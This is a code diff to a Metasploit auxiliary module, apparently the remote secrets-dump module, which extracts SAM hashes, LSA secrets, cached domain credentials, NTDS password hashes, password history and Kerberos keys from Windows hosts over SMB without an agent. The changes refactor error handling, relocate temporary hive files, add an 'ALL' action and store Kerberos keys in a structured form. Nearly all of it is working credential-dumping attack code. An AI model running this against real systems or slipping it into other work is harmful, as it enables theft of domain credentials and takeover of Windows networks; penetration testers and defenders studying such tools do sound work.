@@ -3,7 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'metasploit/framework/hashes/identify'
+require 'metasploit/framework/hashes'
 require 'ruby_smb/dcerpc/client'
 
 class MetasploitModule < Msf::Auxiliary
@@ -12,6 +12,20 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Util::WindowsRegistry
   include Msf::Util::WindowsCryptoHelpers
+
+  # Mapping of MS-SAMR encryption keys to IANA Kerberos Parameter values
+  #
+  # @see RubySMB::Dcerpc::Samr::KERBEROS_TYPE
+  # @see Rex::Proto::Kerberos::Crypto::Encryption
+  # rubocop:disable Layout/HashAlignment
+  SAMR_KERBEROS_TYPE_TO_IANA = {
+    1          => Rex::Proto::Kerberos::Crypto::Encryption::DES_CBC_CRC,
+    3          => Rex::Proto::Kerberos::Crypto::Encryption::DES_CBC_MD5,
+    17         => Rex::Proto::Kerberos::Crypto::Encryption::AES128,
+    18         => Rex::Proto::Kerberos::Crypto::Encryption::AES256,
+    0xffffff74 => Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC
+  }.freeze
+  # rubocop:enable Layout/HashAlignment
 
   def initialize(info = {})
     super(
@@ -22,7 +36,7 @@ class MetasploitModule < Msf::Auxiliary
           Dumps SAM hashes and LSA secrets (including cached creds) from the
           remote Windows target without executing any agent locally. First, it
           reads as much data as possible from the registry and then save the
-          hives locally on the target (%SYSTEMROOT%\random.tmp). Finally, it
+          hives locally on the target (%SYSTEMROOT%\Temp\random.tmp). Finally, it
           downloads the temporary hive files and reads the rest of the data
           from it. This temporary files are removed when it's done.
 
@@ -110,9 +124,6 @@ class MetasploitModule < Msf::Auxiliary
       boot_key << query_info_key_response.lp_class.to_s.encode(::Encoding::ASCII_8BIT)
       @winreg.close_key(subkey_handle)
       subkey_handle = nil
-    rescue RubySMB::Dcerpc::Error::WinregError => e
-      vprint_error("An error occured when retrieving class for #{sub_key}: #{e}")
-      raise e
     ensure
       @winreg.close_key(subkey_handle) if subkey_handle
     end
@@ -141,7 +152,7 @@ class MetasploitModule < Msf::Auxiliary
       @lm_hash_not_stored = false
     end
   rescue RubySMB::Dcerpc::Error::WinregError => e
-    vprint_error("An error occured when checking NoLMHash policy: #{e}")
+    vprint_warning("An error occured when checking NoLMHash policy: #{e}")
   end
 
   def save_registry_key(hive_name)
@@ -151,11 +162,8 @@ class MetasploitModule < Msf::Auxiliary
 
     file_name = "#{Rex::Text.rand_text_alphanumeric(8)}.tmp"
     vprint_status("Save key to #{file_name}")
-    @winreg.save_key(new_key_handle, file_name)
+    @winreg.save_key(new_key_handle, "..\\Temp\\#{file_name}")
     file_name
-  rescue RubySMB::Dcerpc::Error::WinregError => e
-    vprint_error("An error occured when saving #{hive_name} key: #{e}")
-    raise e
   ensure
     @winreg.close_key(new_key_handle) if new_key_handle
     @winreg.close_key(root_key_handle) if root_key_handle
@@ -164,11 +172,8 @@ class MetasploitModule < Msf::Auxiliary
   def retrieve_hive(hive_name)
     file_name = save_registry_key(hive_name)
     tree2 = simple.client.tree_connect("\\\\#{sock.peerhost}\\ADMIN$")
-    file = tree2.open_file(filename: "System32\\#{file_name}", delete: true, read: true)
+    file = tree2.open_file(filename: "Temp\\#{file_name}", delete: true, read: true)
     file.read
-  rescue RubySMB::Dcerpc::Error::WinregError => e
-    vprint_error("An error occured when retrieving #{hive_name} hive file: #{e}")
-    raise e
   ensure
     file.delete if file
     file.close if file
@@ -185,7 +190,9 @@ class MetasploitModule < Msf::Auxiliary
     retrieve_hive('SECURITY')
   end
 
-  def report_creds(user, hash, type: :ntlm_hash, jtr_format: '', realm_key: nil, realm_value: nil)
+  def report_creds(
+    user, hash, type: :ntlm_hash, jtr_format: '', realm_key: nil, realm_value: nil
+  )
     service_data = {
       address: rhost,
       port: rport,
@@ -333,7 +340,7 @@ class MetasploitModule < Msf::Auxiliary
       else
         jtr_hash = "M$#{username}##{cache_info.data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}"
       end
-      credential_opts[:jtr_format] = identify_hash(jtr_hash)
+      credential_opts[:jtr_format] = Metasploit::Framework::Hashes.identify_hash(jtr_hash)
       unless report_creds("#{logon_domain_name}\\#{username}", jtr_hash, **credential_opts)
         vprint_bad("Error when reporting #{logon_domain_name}\\#{username} hash (#{credential_opts[:jtr_format]} format)")
       end
@@ -387,7 +394,7 @@ class MetasploitModule < Msf::Auxiliary
         bind: false
       )
     rescue RubySMB::Dcerpc::Error::WinregError => e
-      vprint_warning("An error occured when getting the default domain name: #{e}")
+      vprint_warning("An error occurred when getting the default domain name: #{e}")
       domain = ''
     end
     username = "#{domain.encode(::Encoding::UTF_8)}\\#{username}" unless domain.nil? || domain.empty?
@@ -403,6 +410,7 @@ class MetasploitModule < Msf::Auxiliary
     "#{domain.upcase}host#{host.downcase}.#{domain.downcase}".b
   end
 
+  # @return [Array[Hash{String => String}]]
   def get_machine_kerberos_keys(raw_secret, _machine_name)
     vprint_status('Calculating machine account Kerberos keys')
     # Attempt to create Kerberos keys from machine account (if possible)
@@ -410,14 +418,29 @@ class MetasploitModule < Msf::Auxiliary
     salt = get_machine_kerberos_salt
     if salt.empty?
       vprint_error('Unable to get the salt')
-      return ''
+      return []
     end
 
-    raw_secret = raw_secret.dup.force_encoding(::Encoding::UTF_16LE).encode(::Encoding::UTF_8, invalid: :replace).b
+    raw_secret_utf_16le = raw_secret.dup.force_encoding(::Encoding::UTF_16LE)
+    raw_secret_utf8 = raw_secret_utf_16le.encode(::Encoding::UTF_8, invalid: :replace).b
 
-    secret << "aes256-cts-hmac-sha1-96:#{aes256_cts_hmac_sha1_96(raw_secret, salt)}"
-    secret << "aes128-cts-hmac-sha1-96:#{aes128_cts_hmac_sha1_96(raw_secret, salt)}"
-    secret << "des-cbc-md5:#{des_cbc_md5(raw_secret, salt)}"
+    secret << {
+      enctype: Rex::Proto::Kerberos::Crypto::Encryption::AES256,
+      key: aes256_cts_hmac_sha1_96(raw_secret_utf8, salt),
+      salt: salt
+    }
+
+    secret << {
+      enctype: Rex::Proto::Kerberos::Crypto::Encryption::AES128,
+      key: aes128_cts_hmac_sha1_96(raw_secret_utf8, salt),
+      salt: salt
+    }
+
+    secret << {
+      enctype: Rex::Proto::Kerberos::Crypto::Encryption::DES_CBC_MD5,
+      key: des_cbc_md5(raw_secret_utf8, salt),
+      salt: salt
+    }
 
     secret
   end
@@ -440,7 +463,7 @@ class MetasploitModule < Msf::Auxiliary
     if upper_name.start_with?('_SC_')
       # Service name, a password might be there
       # We have to get the account the service runs under
-      account = get_service_account(name[4..-1])
+      account = get_service_account(name[4..])
       if account
         secret = "#{account.encode(::Encoding::UTF_8)}:"
       else
@@ -466,13 +489,13 @@ class MetasploitModule < Msf::Auxiliary
       secret = "dpapi_machinekey: 0x#{machine_key.unpack('H*')[0]}\ndpapi_userkey: 0x#{user_key.unpack('H*')[0]}"
     elsif upper_name.start_with?('$MACHINE.ACC')
       md4 = OpenSSL::Digest::MD4.digest(secret_item)
-      machine, domain = get_machine_name_and_domain
+      machine, domain, dns_domain_name = get_machine_name_and_domain_info
       print_name = "#{domain}\\#{machine}$"
       ntlm_hash = "#{Net::NTLM.lm_hash('').unpack('H*')[0]}:#{md4.unpack('H*')[0]}"
       secret_ary = ["#{print_name}:#{ntlm_hash}:::"]
       credential_opts = {
         realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
-        realm_value: domain
+        realm_value: dns_domain_name
       }
       unless report_creds(print_name, ntlm_hash, **credential_opts)
         vprint_bad("Error when reporting #{print_name} NTLM hash")
@@ -485,20 +508,20 @@ class MetasploitModule < Msf::Auxiliary
       end
       secret = "#{print_name}:plain_password_hex:#{raw_passwd}\n"
 
-      extra_secret = get_machine_kerberos_keys(secret_item, print_name)
-      if extra_secret.empty?
+      machine_kerberos_keys = get_machine_kerberos_keys(secret_item, print_name)
+      if machine_kerberos_keys.empty?
         vprint_status('Could not calculate machine account Kerberos keys')
       else
-        credential_opts[:type] = :nonreplayable_hash
-        extra_secret.each do |sec|
-          unless report_creds(print_name, sec, **credential_opts)
-            vprint_bad("Error when reporting #{print_name} machine kerberos key #{sec}")
+        credential_opts[:type] = :krb_enc_key
+        machine_kerberos_keys.each do |key|
+          key_data = Metasploit::Credential::KrbEncKey.build_data(**key)
+          unless report_creds(print_name, key_data, **credential_opts)
+            vprint_bad("Error when reporting #{print_name} machine kerberos key #{krb_enc_key_to_s(key)}")
           end
-          sec.prepend("#{print_name}:")
         end
       end
 
-      secret << extra_secret.concat(secret_ary).join("\n")
+      secret << machine_kerberos_keys.map { |key| "#{print_name}:#{krb_enc_key_to_s(key)}" }.concat(secret_ary).join("\n")
     end
 
     if secret.empty?
@@ -519,8 +542,8 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def get_machine_name_and_domain
-    if simple.client&.default_name == ''
+  def get_machine_name_and_domain_info
+    if simple.client&.default_name.blank?
       begin
         vprint_status('Getting Server Info')
         wkssvc = @tree.open_file(filename: 'wkssvc', write: true, read: true)
@@ -534,9 +557,9 @@ class MetasploitModule < Msf::Auxiliary
         print_error("Error when connecting to 'wkssvc' interface ([#{e.class}] #{e}).")
         return
       end
-      return [info[:wki100_computername].encode('utf-8'), info[:wki100_langroup].encode('utf-8')]
+      return [info[:wki100_computername].encode('utf-8'), info[:wki100_langroup].encode('utf-8'), datastore['SMBDomain']]
     end
-    [simple.client.default_name, simple.client.default_domain]
+    [simple.client.default_name, simple.client.default_domain, simple.client.dns_domain_name]
   end
 
   def connect_samr(domain_name)
@@ -562,7 +585,7 @@ class MetasploitModule < Msf::Auxiliary
     nb_digits = (Math.log10(users.length) + 1).floor
     users = users.each_with_index.map do |(rid, name), index|
       if index % progress_interval == 0
-        percent = (format('%.2f', (index / users.length.to_f * 100))).rjust(5)
+        percent = format('%.2f', (index / users.length.to_f * 100)).rjust(5)
         print_status("SID enumeration progress - #{index.to_s.rjust(nb_digits)} / #{users.length} (#{percent}%)")
       end
       sid = @samr.samr_rid_to_sid(object_handle: @domain_handle, rid: rid)
@@ -623,7 +646,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def decrypt_supplemental_info(dcerpc_client, result, attribute_value)
-    result[:kerberos_keys] = {}
+    result[:kerberos_keys] = []
     result[:clear_text_passwords] = {}
     plain_text = dcerpc_client.decrypt_attribute_value(attribute_value)
     user_properties = RubySMB::Dcerpc::Samr::UserProperties.read(plain_text)
@@ -635,12 +658,12 @@ class MetasploitModule < Msf::Auxiliary
         kerb_stored_credential_new = RubySMB::Dcerpc::Samr::KerbStoredCredentialNew.read(binary_value)
         key_values = kerb_stored_credential_new.get_key_values
         kerb_stored_credential_new.credentials.each_with_index do |credential, i|
-          kerberos_type = RubySMB::Dcerpc::Samr::KERBEROS_TYPE[credential.key_type]
-          if kerberos_type
-            result[:kerberos_keys][kerberos_type] = key_values[i].unpack('H*')[0]
-          else
-            result[:kerberos_keys]["0x#{credential.key_type.to_i.to_s(16)}"] = key_values[i].unpack('H*')[0]
-          end
+          # Extract the kerberos keys, note that the enctype here is a RubySMB::Dcerpc::Samr::KERBEROS_TYPE
+          # not the IANA Kerberos value, which is required for database persistence
+          result[:kerberos_keys] << {
+            enctype: credential.key_type.to_i,
+            key: key_values[i]
+          }
         end
       when 'Primary:CLEARTEXT'
         # [MS-SAMR] 3.1.1.8.11.5 Primary:CLEARTEXT Property
@@ -657,11 +680,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def parse_user_record(dcerpc_client, user_record)
-    vprint_status("Decrypting hash for user: #{user_record.pmsg_out.msg_getchg.p_nc.string_name.to_ary[0..-1].join.encode('utf-8')}")
+    vprint_status("Decrypting hash for user: #{user_record.pmsg_out.msg_getchg.p_nc.string_name.to_ary[0..].join.encode('utf-8')}")
 
     entinf_struct = user_record.pmsg_out.msg_getchg.p_objects.entinf
-    rid = entinf_struct.p_name.sid[-4..-1].unpack('<L').first
-    dn = user_record.pmsg_out.msg_getchg.p_nc.string_name.to_ary[0..-1].join.encode('utf-8')
+    rid = entinf_struct.p_name.sid[-4..].unpack('<L').first
+    dn = user_record.pmsg_out.msg_getchg.p_nc.string_name.to_ary[0..].join.encode('utf-8')
 
     result = {
       dn: dn,
@@ -700,7 +723,7 @@ class MetasploitModule < Msf::Auxiliary
         encrypted_nt_hash = dcerpc_client.decrypt_attribute_value(attribute_value)
         result[:nt_hash] = dcerpc_client.remove_des_layer(encrypted_nt_hash, rid)
       when lookup_table['userPrincipalName']
-        result[:domain_name] = attribute_value.force_encoding('utf-16le').split('@'.encode('utf-16le')).last
+        result[:domain_name] = attribute_value.force_encoding('utf-16le').split('@'.encode('utf-16le')).last.encode('utf-8')
       when lookup_table['sAMAccountName']
         result[:username] = attribute_value.force_encoding('utf-16le').encode('utf-8')
       when lookup_table['objectSid']
@@ -748,7 +771,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def dump_ntds_hashes
-    _machine_name, domain_name = get_machine_name_and_domain
+    _machine_name, domain_name, dns_domain_name = get_machine_name_and_domain_info
     return unless domain_name
 
     print_status('Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)')
@@ -797,19 +820,19 @@ class MetasploitModule < Msf::Auxiliary
 
     credential_opts = {
       realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
-      realm_value: domain_name
+      realm_value: dns_domain_name
     }
 
     print_line('# SID\'s:')
     user_info.each do |sid, info|
-      full_name = "#{domain_name}\\#{info[:username]}"
+      full_name = info[:domain_name].blank? ? info[:username] : "#{info[:domain_name]}\\#{info[:username]}"
       print_line("#{full_name}: #{sid}")
     end
 
     print_line("\n# NTLM hashes:")
     user_info.each do |_sid, info|
       hash = "#{info[:lm_hash].unpack('H*')[0]}:#{info[:nt_hash].unpack('H*')[0]}"
-      full_name = "#{domain_name}\\#{info[:username]}"
+      full_name = info[:domain_name].blank? ? info[:username] : "#{info[:domain_name]}\\#{info[:username]}"
       unless report_creds(full_name, hash, **credential_opts)
         vprint_bad("Error when reporting #{full_name} hash")
       end
@@ -819,7 +842,7 @@ class MetasploitModule < Msf::Auxiliary
     print_line("\n# Full pwdump format:")
     user_info.each do |sid, info|
       hash = "#{info[:lm_hash].unpack('H*')[0]}:#{info[:nt_hash].unpack('H*')[0]}"
-      full_name = "#{domain_name}\\#{info[:username]}"
+      full_name = info[:domain_name].blank? ? info[:username] : "#{info[:domain_name]}\\#{info[:username]}"
       pwdump = "#{full_name}:#{info[:rid]}:#{hash}:"
       extra_info = "Disabled=#{info[:disabled].nil? ? 'N/A' : info[:disabled]},"
       extra_info << "Expired=#{!info[:disabled] && info[:expires] && info[:expires] > Time.at(0) && info[:expires] < Time.now},"
@@ -851,20 +874,20 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_line("\n# Password history (pwdump format - uid:rid:lmhash:nthash:::):")
+    if @lm_hash_not_stored.nil?
+      print_warning(
+        'NoLMHash policy was not retrieved correctly and we don\'t know if '\
+        'LMHashes are being stored or not. We are assuming it is stored and '\
+        'the lmhash value will be displayed in the following hash. If it is '\
+        "not stored, just replace it with the empty lmhash (#{Net::NTLM.lm_hash('').unpack('H*')[0]})"
+      )
+    end
     user_info.each do |_sid, info|
-      full_name = "#{domain_name}\\#{info[:username]}"
+      full_name = info[:domain_name].blank? ? info[:username] : "#{info[:domain_name]}\\#{info[:username]}"
 
       if info[:nt_history].size > 1 || info[:lm_history].size > 1
-        info[:nt_history][1..-1].zip(info[:lm_history][1..-1]).reverse.each_with_index do |history, i|
+        info[:nt_history][1..].zip(info[:lm_history][1..]).reverse.each_with_index do |history, i|
           nt_h, lm_h = history
-          if @lm_hash_not_stored.nil? && lm_h
-            print_warning(
-              'NoLMHash policy was not retrieved correctly and we don\'t know if '\
-              'LMHashes are being stored or not. We are assuming it is stored and '\
-              'the lmhash value will be displayed in the following hash. If it is '\
-              "not stored, just replace it with the empty lmhash (#{Net::NTLM.lm_hash('').unpack('H*')[0]})"
-            )
-          end
           lm_h = Net::NTLM.lm_hash('') if lm_h.nil? || @lm_hash_not_stored
           history_hash = "#{lm_h.unpack('H*')[0]}:#{nt_h.unpack('H*')[0]}"
           history_name = "#{full_name}_history#{i}"
@@ -880,18 +903,25 @@ class MetasploitModule < Msf::Auxiliary
 
     print_line("\n# Kerberos keys:")
     user_info.each do |_sid, info|
-      full_name = "#{domain_name}\\#{info[:username]}"
+      full_name = info[:domain_name].blank? ? info[:username] : "#{info[:domain_name]}\\#{info[:username]}"
 
       if info[:kerberos_keys].nil? || info[:kerberos_keys].empty?
         vprint_line("No Kerberos keys for #{full_name}")
       else
-        credential_opts[:type] = :nonreplayable_hash
-        info[:kerberos_keys].each do |key_type, key_value|
-          key = "#{key_type}:#{key_value}"
-          unless report_creds(full_name, key, **credential_opts)
-            vprint_bad("Error when reporting #{full_name} kerberos key #{key}")
+        credential_opts[:type] = :krb_enc_key
+        info[:kerberos_keys].each do |key|
+          krb_enckey = {
+            **key,
+            # Map the SAMR kerberos key to an IANA compatible enctype before persisting
+            enctype: SAMR_KERBEROS_TYPE_TO_IANA[key[:enctype]]
+          }
+
+          krb_enckey_to_s = krb_enc_key_to_s(krb_enckey)
+          key_data = Metasploit::Credential::KrbEncKey.build_data(**krb_enckey)
+          unless report_creds(full_name, key_data, **credential_opts)
+            vprint_bad("Error when reporting #{full_name} kerberos key #{krb_enckey_to_s}")
           end
-          print_line "#{full_name}:#{key}"
+          print_line "#{full_name}:#{krb_enckey_to_s}"
         end
       end
     end
@@ -916,7 +946,7 @@ class MetasploitModule < Msf::Auxiliary
     @samr.close_handle(@domain_handle) if @domain_handle
     @samr.close_handle(@builtin_domain_handle) if @builtin_domain_handle
     @samr.close_handle(@server_handle) if @server_handle
-    @samr.close
+    @samr.close if @samr
     if dcerpc_client
       dcerpc_client.drs_unbind(ph_drs)
       dcerpc_client.close
@@ -983,7 +1013,7 @@ class MetasploitModule < Msf::Auxiliary
     begin
       @scm_handle = open_sc_manager
     rescue RubySMB::Error::RubySMBError => e
-      print_error(
+      print_warning(
         'Unable to connect to the remote Service Control Manager. It will fail '\
         "if the 'RemoteRegistry' service is stopped or disabled ([#{e.class}] #{e})."
       )
@@ -1002,10 +1032,9 @@ class MetasploitModule < Msf::Auxiliary
       @winreg = @tree.open_file(filename: 'winreg', write: true, read: true)
       @winreg.bind(endpoint: RubySMB::Dcerpc::Winreg)
     rescue RubySMB::Error::RubySMBError => e
-      if action.name == 'DOMAIN'
+      if ['DOMAIN', 'ALL'].include?(action.name)
         print_warning(
-          "Error when connecting to 'winreg' interface ([#{e.class}] #{e})... continuing "\
-          'since action is DOMAIN'
+          "Error when connecting to 'winreg' interface ([#{e.class}] #{e})... skipping"
         )
       else
         fail_with(Module::Failure::Unreachable,
@@ -1015,22 +1044,28 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
 
-    boot_key = ''
-    begin
-      boot_key = get_boot_key if @winreg
-    rescue RubySMB::Error::RubySMBError => e
-      print_error("Error when getting BootKey: #{e}")
-    end
-    if boot_key.empty?
-      if action.name == 'DOMAIN'
-        print_warning('Unable to get BootKey... continuing since action is DOMAIN')
-      else
-        fail_with(Module::Failure::Unknown,
-                  'Unable to get BootKey. If it is a Domain Controller, you can still '\
-                  'try DOMAIN action since it does not need BootKey')
+    unless action.name == 'DOMAIN'
+      boot_key = ''
+      begin
+        boot_key = get_boot_key if @winreg
+      rescue RubySMB::Error::RubySMBError => e
+        if ['DOMAIN', 'ALL'].include?(action.name)
+          print_warning("Error when getting BootKey... skipping: #{e}")
+        else
+          print_error("Error when getting BootKey: #{e}")
+        end
       end
+      if boot_key.empty?
+        if action.name == 'ALL'
+          print_warning('Unable to get BootKey... skipping')
+        else
+          fail_with(Module::Failure::NotFound,
+                    'Unable to get BootKey. If it is a Domain Controller, you can still '\
+                    'try DOMAIN action since it does not need BootKey')
+        end
+      end
+      report_info(boot_key.unpack('H*')[0], 'host.boot_key')
     end
-    report_info(boot_key.unpack('H*')[0], 'host.boot_key')
 
     check_lm_hash_not_stored if @winreg
 
@@ -1038,7 +1073,11 @@ class MetasploitModule < Msf::Auxiliary
       begin
         sam = save_sam
       rescue RubySMB::Error::RubySMBError => e
-        print_error("Error when getting SAM hive ([#{e.class}] #{e}).")
+        if action.name == 'ALL'
+          print_warning("Error when getting SAM hive... skipping ([#{e.class}] #{e}).")
+        else
+          print_error("Error when getting SAM hive ([#{e.class}] #{e}).")
+        end
         sam = nil
       end
 
@@ -1052,7 +1091,11 @@ class MetasploitModule < Msf::Auxiliary
       begin
         security = save_security
       rescue RubySMB::Error::RubySMBError => e
-        print_error("Error when getting SECURITY hive ([#{e.class}] #{e}).")
+        if action.name == 'ALL'
+          print_warning("Error when getting SECURITY hive... skipping ([#{e.class}] #{e}).")
+        else
+          print_error("Error when getting SECURITY hive ([#{e.class}] #{e}).")
+        end
         security = nil
       end
 
@@ -1100,5 +1143,13 @@ class MetasploitModule < Msf::Auxiliary
     @tree.disconnect! if @tree
     simple.client.disconnect! if simple&.client.is_a?(RubySMB::Client)
     disconnect
+  end
+
+  private
+
+  # @param [Hash] data The keyberos enc key, containing enctype, key and salt
+  def krb_enc_key_to_s(data)
+    enctype_name = Rex::Proto::Kerberos::Crypto::Encryption::IANA_NAMES[data[:enctype]] || "0x#{data[:enctype].to_i.to_s(16)}"
+    "#{enctype_name}:#{data[:key].unpack1('H*')}"
   end
 end
